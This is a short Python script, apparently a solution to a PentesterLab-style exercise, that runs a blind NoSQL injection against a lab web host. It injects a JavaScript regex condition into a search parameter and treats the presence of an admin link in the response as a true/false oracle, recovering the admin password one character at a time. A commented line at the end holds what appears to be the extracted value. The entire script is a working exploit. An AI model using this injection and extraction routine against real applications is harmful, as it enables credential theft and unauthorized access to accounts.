import requests

letters = '-0123456789abcdef'

password = ''

def passcracker():
	global password
	for letter in letters:
		response = requests.get("http://ptl-91ddcca0-46d52ec9.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^"+password+letter+".*$/)%00")

		if '<a href="?search=admin">admin</a>' in response.text:
			password += letter
			print(f"till now : {password}")
			return passcracker()
		elif letter == letters[-1]:
			print(f"final password: {password}")
			return 0

passcracker()

#content = response.text
#5b317d17-3ee3-4865-8605-bb579f58c10a


